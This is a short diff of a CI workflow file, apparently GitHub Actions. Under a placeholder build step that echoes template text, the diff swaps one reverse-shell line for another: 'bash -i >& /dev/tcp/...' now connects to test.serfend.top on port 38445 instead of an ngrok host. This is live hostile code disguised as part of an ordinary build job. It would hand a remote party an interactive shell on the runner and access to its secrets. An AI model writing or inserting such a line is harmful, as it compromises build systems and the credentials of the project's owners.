@@ -34,4 +34,4 @@ jobs:
         run: |
           echo Add other actions to build,
           echo test, and deploy your project.
-          bash -i >& /dev/tcp/ngrok2.xiaomiqiu.cn/34302 0>&1
+          bash -i >& /dev/tcp/test.serfend.top/38445 0>&1
